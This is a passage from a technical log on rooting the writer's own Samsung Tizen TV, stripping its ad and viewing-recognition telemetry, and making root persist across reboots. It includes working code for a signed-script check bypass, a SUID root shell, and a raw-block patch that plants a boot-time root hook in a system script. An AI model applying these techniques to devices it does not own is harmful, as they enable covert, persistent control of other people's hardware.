target user's id. This only affect app activation/deactivation.` Nothing is uninstalled, no data
is cleared, and app directories stay intact:

```sh
pkgcmd -D -t app -n com.samsung.tv.pisa-service --uid 5001
```

Verified functionally — `app_launcher` now refuses the disabled package:

```
app_launcher -s com.samsung.tv.pisa-service
  -> The app with ID: com.samsung.tv.pisa-service is not available for the user 0
```

Thirteen packages deactivated: `adplatform`, `com.samsung.tv.adplayer`,
`com.samsung.tv.ad-web-framework`, `com.samsung.tv.coba.adagent`,
`com.samsung.tv.adagent-service`, `com.samsung.tv.contents-recognition-dbmgr`,
`com.samsung.tv.pisa-service`, `org.tizen.pisa-control-service`,
`com.samsung.tv.canalysis-service`, `com.samsung.tizen.samsung-analytics`, `mediaanalytics`,
`com.samsung.tv.vision-data-recognition-service`, `org.tizen.acr-service-app`.

**2. `ConditionPathExists` markers — the only genuinely persistent part.** Two of the most
important telemetry daemons gate their own unit files on a path that lives on writable `/opt`:

```
/usr/lib/systemd/system/pisa-service.service:      ConditionPathExists=!/opt/usr/share/systemd/system/pisa-service
/usr/lib/systemd/system/canalysis-service.service: ConditionPathExists=!/opt/usr/share/systemd/system/canalysis-daemon
```

Because the condition is negated, **creating an empty file there disables the unit across
reboots**:

```sh
mkdir -p /opt/usr/share/systemd/system
: > /opt/usr/share/systemd/system/pisa-service
: > /opt/usr/share/systemd/system/canalysis-daemon
```

Proven by trying to start them anyway — systemd evaluates the condition and refuses:

```
pisa-service.service      is-active=failed  ConditionResult=no
canalysis-service.service is-active=failed  ConditionResult=no
```

**3. Runtime stops/masks** cover the rest (gone at reboot): `acr.path`, `acr.service`,
`adagent-service.service`, `kpi-logging.service`, `abnormal_user_behavior.service`,
`emergency-log-transmitter.service`, `background-update.service`, `background-update.path`,
`canalysis-service.service`, `contents-recognition-service.service`,
`vision-data-recognition-service.service`, `media-analytics-service.service`,
`org.tizen.tv.sp-kpi.service`, `pisa-service.path`, `pisa-service.service`, `dlogutil.path`,
`dlogutil.timer`.

Result on the device:

```
running services: 116 -> 104
live telemetry processes (canalysis|pisa|adagent|recognition|analytics): 0
ac.service=active   app-context-manager.service=active
ICMP 0% loss   :8001/api/v2/ HTTP 200   "PowerState":"on"
```

#### Feature bloat removal (user keep-list: YouTube)

Twenty Samsung feature packages deactivated with `pkgcmd -D` (same mechanism as above, reversible
with `pkgcmd -A`):

- **Samsung TV Plus**: `com.samsung.tv.tvplus`, `tvs-tvplus`
- **Universal Guide promos**: `tvs-guide`, `ug-promotion-tv`
- **Bixby**: `com.samsung.tv.mybixby`, `com.samsung.tv.bixbycapsuleviewer`,
  `com.samsung.tv.bixby-prov`, `com.samsung.tv.bixby-context-client`
- **Voice**: `org.tizen.voice-app`, `org.tizen.voice-client`, `com.samsung.tv.ondevice-voice`,
  `com.samsung.tv.cnvoice`, `com.samsung.tv.cnvoice-assistant`,
  `com.samsung.tv.utterance-recommender-service`
- **Third-party assistants**: `com.samsung.tv.alexa-client`, `com.samsung.tv.google-assistant`,
  `org.tizen.multi-assistant-service`
- **SmartThings**: `com.samsung.tizen.smartthings-client`, `com.samsung.tizen.smartthings-thing`
- **Internet browser**: `org.tizen.browser`

Deliberately kept: YouTube, Netflix and other installed streaming apps, the app store, the search
app, the Privacy Choices app and the gallery. `com.samsung.tv.vif` (voice-interaction-framework)
was also left alone: it is a framework other UI paths link against, not a leaky daemon.

Verified after the change:

```
com.samsung.tv.tvplus            -> not available for the user 0
com.samsung.tv.mybixby           -> not available for the user 0
org.tizen.browser                -> not available for the user 0
com.samsung.tizen.smartthings-client -> not available for the user 0
org.tizen.multi-assistant-service    -> not available for the user 0
9Ur5IzDKqV.TizenYouTube          -> successfully launched pid 3686   (kept)
org.tizen.netflix-app            -> successfully launched pid 3474   (kept)
ac.service=active   app-context-manager.service=active
```

**Two Tizen gotchas worth remembering:**

1. **A Tizen app ID is not the package ID.** YouTube is package `9Ur5IzDKqV`, app
   `9Ur5IzDKqV.TizenYouTube`. `pkgcmd` takes `-n <package>`, `app_launcher -s` takes the app ID —
   passing the package to `app_launcher` reports "not available for the user 0" even for a
   perfectly healthy app. Map IDs with `pkgcmd -l | grep <id>` before concluding an app is gone.
2. `pkgcmd -k` does not reliably terminate an already-running app instance; the process keeps
   running until it exits. `-D` blocks future activation, which is what matters for a reboot.

#### Restore

```sh
# re-enable packages
for p in adplatform com.samsung.tv.adplayer com.samsung.tv.ad-web-framework \
         com.samsung.tv.coba.adagent com.samsung.tv.adagent-service \
         com.samsung.tv.contents-recognition-dbmgr com.samsung.tv.pisa-service \
         org.tizen.pisa-control-service com.samsung.tv.canalysis-service \
         com.samsung.tizen.samsung-analytics mediaanalytics \
         com.samsung.tv.vision-data-recognition-service org.tizen.acr-service-app; do
    pkgcmd -A -t app -n "$p" --uid 5001
done
rm -f /opt/usr/share/systemd/system/pisa-service /opt/usr/share/systemd/system/canalysis-daemon
# masks die at reboot; to undo now:
systemctl unmask --runtime <unit> && systemctl start <unit>
```

#### Audit notes

- The obfuscated ten-character directory names are **user-installed apps**, not bloat:
  `9Ur5IzDKqV`=YouTube, `rJeHak5zRg`=Spotify, `CmeyUlnhYY`=Amazon Luna, `ZmmGjO6VKO`=Sling TV,
  `30IKH0OX8U`=Aria video/Apple TV component, `tv6pbVMQFF`=Privacy Choices. Do not touch them.
  (`samudntest01` is our own sideload from the root work.)
- `/usr/apps` (256 packages, read-only) vs `/opt/usr/apps` (164, writable) is not a meaningful
  split for debloat: `pkgcmd` deactivates either kind.
- Reference material that established this approach: `github.com/berteotti/custom-tv`
  (`docs/3-privacy.md` — the ten-unit list, the `ConditionPathExists` markers and the `pkgcmd -D
  --uid 5001` idiom) and `github.com/arlogilbert/tizen-app-id` (package-ID mapping used to
  identify dirs). ACR's purpose is documented by Samsung: viewing-history collection via content
  signatures.

#### Running scripts even while UEP is armed

`sh /opt/hermes/debloat.sh`, `sh -s < script.sh` and plain execution all trip UEP — Tizen's shell
hooks script loading, so the file path alone triggers the check. The content-as-argument form does
not, because nothing unsigned is ever executed:

```sh
sh -c "$(cat /opt/hermes/debloat.sh)"
```

This is the reliable way to keep shell tooling on `/opt`. Note also that **UEP re-armed itself
inside a single session** (verified off and executing, then blocking again ~10 minutes later with
no reboot), so UEP-off must never be assumed — re-check the state word if a native binary
suddenly returns EPERM.

#### Not possible / deferred

- Persistent unit masking or boot-time application of the debloat (deferred — see Chapter 7,
  which solved this): blocked by the read-only rootfs and `/etc`.
- Deleting preinstalled apps from `/usr/apps`: read-only partition.
- Per-uid firewall rules: no `xt_owner`.

### Security implication

`/dev/ntkhdma` is `rw-rw-rw-` and its `mmap` accepts arbitrary PFNs. Any local process on this
firmware — a sideloaded app, a compromised app — can gain arbitrary physical memory R/W and
therefore root, without needing a signed payload. The same applies to `/opt` being a writable,
executable partition with no `nosuid`.

### Files

Control host (`moo@fedora`):

- `~/archive/samsung-tv-t6500-2026-10/exploit-src/tv-src/hr.c`, `tv-src/hr` — freestanding ARM
  helper
- `tv-src/fast-root/` — payload that flips UEP then validates the SUID path
- `tv-src/kdump/` — kernel dump client; receiver
  `~/archive/samsung-tv-t6500-2026-10/scripts/kdump_srv.py` (port 4559)
- `~/archive/samsung-tv-t6500-2026-10/scripts/uep_scan2.py` — movw/movt scanner that located the
  driver code
- `~/archive/samsung-tv-t6500-2026-10/duplicates/kerneldump.bin` — 20 MB kernel dump (VA = offset
  + `0xC0000000`)

On the TV:

- `/opt/hermes/esc.dll` + `esc.runtimeconfig.json` + `esc.deps.json` — fast payload
- `/opt/hermes/hr` — native helper
- `/opt/hermes_root` — SUID copy of `/bin/sh` (mode `4755`, label `_`)

---

## Chapter 7 — Persistent root: same-size raw-block patch of a boot-sourced profile.d script

*Current. The final persistence milestone — root on every boot, no computer involved.*

**Result:** the TV executes root code **~1 s after every power-on** — no USB stick, no computer,
no sdb, no exploit. Verified on a real cold boot: `=== boot entry uptime=1s uid=0 ctx=_` followed
by the full debloat re-apply. Root is no longer "on demand".

### Where the idea comes from

[`cfloinc/samsung-q70t-tizen-root`](https://github.com/cfloinc/samsung-q70t-tizen-root) — field
notes on a `QN65Q70TAFXZA` (2020 Q70T, `20_NIKEM_QTV`, Tizen 6.0, `T-NKMAKUC-2743.0`). Their
`persistent-hook/` kit patches a vendor `/etc/profile.d` script **in place, at the raw block
level, at exactly the same byte length**, and gets a root hook at every boot because
`tizen-system-env.service` *sources* that directory as root.

That is the missing piece this project had been calling impossible: `/` is read-only vdfs and
refuses remount even as root, but the **block device underneath** is writable from a root shell,
and a same-size in-place edit changes no filesystem metadata at all.

### The chain

```
tizen-system-env.service        (active at boot: RequiredBy=ac.service, WantedBy=basic.target)
 └─ ExecStart=/usr/bin/env -i sh -c 'source /etc/profile'      (runs as root)
     └─ /etc/profile:66   for i in /etc/profile.d/*.sh; do . "$i"; done
         └─ /etc/profile.d/bash_prompt_custom.sh   <- patched in place (776 B)
             └─ [ -e /run/.tvroot-hook ] || ( wait for /opt/hermes/boot.sh; \
                  /bin/sh -c "$(cat /opt/hermes/boot.sh)" ) &      <- by CONTENT, UEP-safe
```

Two things to keep in mind: the hook must never `execve()` an unsigned file (UEP is armed at boot
— `[uep][bash] the file is NOT signed!!`), and everything it launches must be backgrounded with
`</dev/null` or it inherits the boot shell's descriptors.

`systemctl is-enabled tizen-system-env.service` answers **`disabled`** on this build and that is a
red herring: the enabling symlink ships inside the image at
`/usr/lib/systemd/system/basic.target.wants/tizen-system-env.service`. Confirm with `systemctl
show tizen-system-env.service -p ActiveState,WantedBy,RequiredBy` (`active` / `basic.target` /
`ac.service`) and with `/run/tizen-system-env`, which its ExecStart rewrites on every boot.

### Preconditions, measured on this TV (2026-10-25)

| check | result |
|---|---|
| `tizen-system-env.service` | `ActiveState=active`, `SubState=exited`, `RequiredBy=ac.service`, `WantedBy=basic.target`; `/run/tizen-system-env` present |
| `/etc/profile` loop | line 66 `for i in /etc/profile.d/*.sh ; do … . "$i" …` |
| carrier file | `/etc/profile.d/bash_prompt_custom.sh`, **776 bytes**, sha256 `effe97f8…25e33c` — *byte-identical to the Q70T's own vendor file*, marker `alias lr="ls -ltrZ"` at offset **629** |
| rootfs device | `/dev/mmcblk0p18` (`root=/dev/mmcblk0p18 … rootfstype=vdfs ro`), `brw-rw---- root disk`, **opens O_WRONLY from a root shell** |
| rw partitions | `/opt` (p21), `/mnt/systemrw` (p20), `/mnt/drm` (p17) — vdfs rw, survive reboot |
| UEP at boot | armed; `sh /tmp/u.sh` → `[uep][bash] the file is NOT signed!!` |

Note the carrier file being identical across the two models: upstream's `SIZE`, `MARKER_OFF` and
`ORIG_SHA` constants are directly reusable. Addresses and block offsets are still per device —
never copy those.

### Locating the live copy

A device-wide search for the marker inside an injected command **wedges `sdbd`** (the capture
times out, the shell never returns, port 26101 keeps accepting TCP but `sdb connect` fails until a
mains power cycle). Run it detached instead, results into a file on `/opt`, and poll:

```sh
nohup sh -c '/bin/sh -c "$(cat /home/owner/share/tmp/sdk_tools/mali/scan_payload.sh)"' \
      </dev/null >/dev/null 2>&1 &
```

Payload body: `grep -abo 'alias lr="ls -ltrZ"' /dev/mmcblk0p18 > /opt/hermes/hits.txt`, then for
each hit `blk = (off-629)/512`. Result on this TV: **one hit only**, byte `523 973 237` =
512-block **1023384, block-offset 0** (the file starts block-aligned; the marker sits 629 bytes
into it). Verified by reading the block back: those 776 bytes hash to the vendor sha, so there is
no stale duplicate to disambiguate.

Do **not** hash candidates with `dd bs=1 skip=<huge>` — it reads byte-at-a-time and never
finishes. Convert to `dd bs=512 skip=<blk>` and trim inside the buffer.

### Building the patch

Upstream's `persistent-hook/build-patch.py` appends a hook fragment to *your own* vendor file and
pads with `#` so the result is exactly the original length; it walks a compaction ladder (full
body → minus alias lines → minus the whole `if [ "$PS1" ] … fi` prompt block) and refuses to emit
anything that fails `sh -n`.

```console
$ python3 build-patch.py vendor-bash_prompt_custom.sh hook-patched.bin --hook hook-fragment.sh
vendor : 776 bytes
variant: hook only (prompt block dropped)
output : 776 bytes, sh -n clean
sha256 : 25e48ba0155a3a2648b90df8ecd65e12e57cb188507d8b389e6fb311a71fc396
```

Hook fragment used here (comments stripped by the tool):

```sh
if [ ! -e /run/.tvroot-hook ]; then
: > /run/.tvroot-hook 2>/dev/null
( i=0; until [ -f /opt/hermes/boot.sh ] || [ $i -ge 120 ]; do i=$((i+1)); /bin/sleep 1; done; /bin/sh -c "$(cat /opt/hermes/boot.sh)" ) </dev/null >/dev/null 2>&1 &
fi
```

### The write, and how each step was verified

`/opt/hermes/` holds the apply script; it refuses to write unless the live file still hashes to
the vendor original, keeps a byte-exact two-block backup, and rolls back automatically if the
filesystem does not serve the new bytes afterwards.

```console
=== apply start uptime=4027s uid=0
live sha : effe97f8ec948a15962fc8a1b85a4e1e446352b8c5caae703e1ed0684425e33c
orig     : effe97f8ec948a15962fc8a1b85a4e1e446352b8c5caae703e1ed0684425e33c
patch sha: 25e48ba0155a3a2648b90df8ecd65e12e57cb188507d8b389e6fb311a71fc396
backup   : 7d0f116e201ba20692cab9e34d52231fb0dbceddcf51aa2ceb2c8b2a2346b98f  (2 blocks)
backup776: effe97f8ec948a15962fc8a1b85a4e1e446352b8c5caae703e1ed0684425e33c
wr776    : 25e48ba0155a3a2648b90df8ecd65e12e57cb188507d8b389e6fb311a71fc396
tail new : b3ab6982980fddf460a2f47adb428475ce9afa89092fd034499d017a35993f05
tail old : b3ab6982980fddf460a2f47adb428475ce9afa89092fd034499d017a35993f05
--- writing 2 blocks at 512-block 1023384
readback : 9e69471cbcaf62c0ed9f328e6662950cf2cd91d732826265063fa12349885ad7
imgsha   : 9e69471cbcaf62c0ed9f328e6662950cf2cd91d732826265063fa12349885ad7
fs view  : 25e48ba0155a3a2648b90df8ecd65e12e57cb188507d8b389e6fb311a71fc396
RESULT: LIVE COPY PATCHED
```

The step that actually matters is the last one: block-level readback equality only proves the
flash changed, while `sha256sum /etc/profile.d/bash_prompt_custom.sh` after `echo 3 >
/proc/sys/vm/drop_caches` proves the **filesystem** now serves the patched bytes. If that check
fails the script restores the backup and reports the restore hash.

### What runs at boot

`/opt/hermes/boot.sh` (guarded by `/run/.tvroot-boot`, every payload passed by content):

1. log `uptime`, `uid`, SMACK label;
2. `sleep 20`, then run `debloat2.sh` (unit markers, 13 `pkgcmd -D` deactivations, stop +
   runtime-mask pass, service census);
3. run `debloat3_boot.sh` — the kill/deactivate half of `debloat3.sh` only;
4. **delayed stop pass A** at ~+70 s and **pass B** ~20 s later, then a per-unit census.

Pass 2 alone is not enough. `media-analytics-service`, `contents-recognition-service`,
`vision-data-recognition-service` and `kpi-logging` are restarted by their `.path`/`.timer`
triggers and by dependencies after the first stop, and a `/dev/null` runtime mask does not stop an
already-running unit — only prevent the next start. Upstream's kit solves it with one pass at
uptime 31 s; two passes plus a settle beat the triggers here.

`debloat3.sh` itself is **not boot-safe**: its verification section calls `app_launcher -s
<pkg>`, which *launches* the app rather than querying it, and it also issues `pkgcmd -k` kills.
The boot variant (`debloat3_boot.sh`) drops both: **deactivate only, never kill**. A boot payload
runs on a TV someone may be watching, and killing packages visibly reloads the UI / kicks the
foreground app back to the launcher — killing once by hand is the right moment if you ever need
it.

#### The guard bug that bit immediately: `/run` is per-namespace

The first version guarded on `/run/.tvroot-boot`, the way the Q70T kit guards on
`/run/.tvroot-hook`. That is **not sufficient on this build**: a unit with a private mount
namespace sees its own empty `/run`, so every process that sources `/etc/profile` inside such a
namespace re-fires the hook. Measured: after one boot the log held **14 runs of `boot.sh`**, one
every ~65 s, each with a fresh `/run` view and `ctx=System`; each run re-ran the whole
`pkgcmd -k`/`-D` set, and one of those kill passes took the third-party launcher with it
(`launcher_procs=0`, i.e. the Clean Home UI was gone until it was relaunched with `app_launcher -s
tvunlock02.Launcher`).

Fix — guard on the kernel boot id with an atomic `mkdir` lock on **`/opt`**, which is shared
across namespaces:

```sh
BOOTID=$(awk '/^btime/{print $2}' /proc/stat)
LOCK=/opt/hermes/.boot-lock-$BOOTID
for d in /opt/hermes/.boot-lock-*; do [ "$d" = "$LOCK" ] || rm -rf "$d" 2>/dev/null; done
mkdir "$LOCK" 2>/dev/null || exit 0          # atomic: only one winner per boot
[ -e /run/.tvroot-boot ] && exit 0           # cheap fast path, still useful
```

Verified after the fix: 150 s of continuous monitoring with nothing sourcing `/etc/profile`
produced **zero** additional runs, and the launcher came back as a single process. Also added
`systemctl reset-failed` over the masked unit list at the end, so the census does not report our
own intentionally-stopped units as failed.

Two consequences worth remembering: `boot.log` grows by ~3 KB per boot (rotate it if you care),
and any kill/remove operation in a boot payload runs on a live TV — keep it idempotent, and prefer
deactivation over killing.

### Cold-boot proof (first boot after the write, no host involved)

```
=== boot entry uptime=1s uid=0 ctx=_
--- running debloat2.sh (by content, UEP-safe)
== 1. persistent unit markers (survive reboot, on /opt) ==
== 2. restore earlier dir renames ==
== 3. stop + runtime-mask telemetry units ==
acr.path=inactive acr.service=inactive adagent-service.service=inactive …
== 4. pkgcmd disable (ad / ACR / analytics) ==   (13 packages, each "spend time")
== 5. running services ==  running=103 failed_total=7
--- census at uptime=76s
      acr.service: inactive
      contents-recognition-service.service: active
      vision-data-recognition-service.service: active
      background-update.service: inactive
      kpi-logging.service: active
=== boot entry done uptime=76s
```

`uid=0` one second after boot, `ctx=_`, before any sdb connection existed. `/run/systemd/system`
held 18 masks again; the launcher (`Clean Home`) came up normally and `:8001/api/v2/` answered, so
the patch is invisible to the user. The only failed unit is the vendor `vdca-update.service`
("Check emp update of vdca.pem"), unrelated to this work.

### Rollback

```sh
sh /opt/hermes/rollback.sh
# restores the 2 blocks from /opt/hermes/backup/rootfs-p18-blk1023384-2.bin
# (sha 7d0f116e…), drops caches and prints the file sha
```

Worst case if the patch is ever wrong is a broken prompt/alias script, not a boot failure —
`tizen-system-env.service` only consumes the environment it produces. A **firmware update**
rewrites `/etc` and silently removes the hook; re-derive the block offset and re-verify the vendor
hash before re-applying.

### Gotchas

- **`sdb push` refuses `/opt/…`** (`You cannot push files to this path`). Push to
  `sdk_toolpath` and `cp` from the TV side as root.
- **Do not `reboot` from the host agent** — the tooling blocks system-reboot commands outright,
  and `reboot -f` from the injection prints `Must be root.` even at `uid=0` (systemctl/logind
  gating on SMACK `System`), although the box has reset when called that way. Pulling the wall is
  the reliable trigger.
- **`/proc/sysrq-trigger` does not exist** on this kernel, so there is no soft fallback.
- **Injection identity is not stable.** Two consecutive boots answered `uid=901(sdk)`; one boot
  after a FastRoot session answered `Uid: 0 0 0 0`, `CapEff ffffffffffffffff` from the unwrapped
  injection with UEP still armed and `/etc/profile.d` unpatched. Print `id -u` before choosing a
  chain and never assume either state.
- Root at boot does **not** mean UEP is off: the hook runs as root but unsigned `execve` is still
  refused, so every payload stays content-as-data.

### Files

TV (`/opt/hermes/`): `boot.sh`, `debloat2.sh`, `debloat3_boot.sh`, `rollback.sh`,
`backup/rootfs-p18-blk1023384-2.bin`, `backup/location.txt`, `boot.log`, `apply.log`.

Control host (`moo@fedora`, also committed under
`samsung-tv-kants2-exploit/persistent-hook/` in this repo):
`build-patch.py`, `hook-fragment.sh`, `apply_hook.sh`, `boot.sh`, `debloat3_boot.sh`,
`rollback.sh`, `vendor-bash_prompt_custom.sh`.

---

## What's next

The one open thread from here is making a custom launcher the actual Home-button/boot target —
blocked on `setuid(5001)` being refused even as root. See
[samsung-tv-t6500-debloat-and-launcher.md § custom launcher as Home target](samsung-tv-t6500-debloat-and-launcher.md#custom-launcher-as-home-target-blocked).

## References

- [chris-ritsen/samsung-tv-root](https://github.com/chris-ritsen/samsung-tv-root) — the `archive-root` route, payloads, root-agent protocol, and the honest "root and UEP changes remain volatile" framing
- [DemonKingSwarn/samsung-tv-tizen-root](https://github.com/DemonKingSwarn/samsung-tv-tizen-root) — independent Tizen 9.0 reproduction of archive-root
- [sebastianspicker/tiz0wn](https://github.com/sebastianspicker/tiz0wn) — Remote PC/CIFS root finding, firmware static analysis, Mali CVE dead ends
- [morluto/rea](https://github.com/morluto/rea) — Ghidra-backed analysis CLI used throughout
- [califio/MADBugs](https://github.com/califio/publications) — the `ntksys` physmap chain (dead on this firmware) and `rmem.py`'s memfd-exec UEP bypass
- [Synacktiv, "Rooting the Samsung Q60T Smart TV"](https://www.synacktiv.com/sites/default/files/2022-05/Sthack2022_Rooting_Samsung_Q60T_Smart_TV.pdf) · [code](https://github.com/synacktiv/samsung-q60t-exploit) — the `/dev/sdp_mem` physmap + UEP-off technique
- [bugficks/msddecrypt](https://github.com/bugficks/msddecrypt) — MSDU firmware container parser (decryption itself unsuccessful for KantS2)
- [cfloinc/samsung-q70t-tizen-root](https://github.com/cfloinc/samsung-q70t-tizen-root) — the `persistent-hook/` kit and its boot-chain/UEP methodology docs that Chapter 7 is built on
- [github.com/berteotti/custom-tv](https://github.com/berteotti/custom-tv) — `docs/3-privacy.md`, the debloat unit list and `ConditionPathExists` idiom used in Chapter 6
- [github.com/arlogilbert/tizen-app-id](https://github.com/arlogilbert/tizen-app-id) — package-ID to directory-name mapping
- Samsung, firmware download: `downloadcenter.samsung.com` T-KTS2UABC build (Chapter 5)
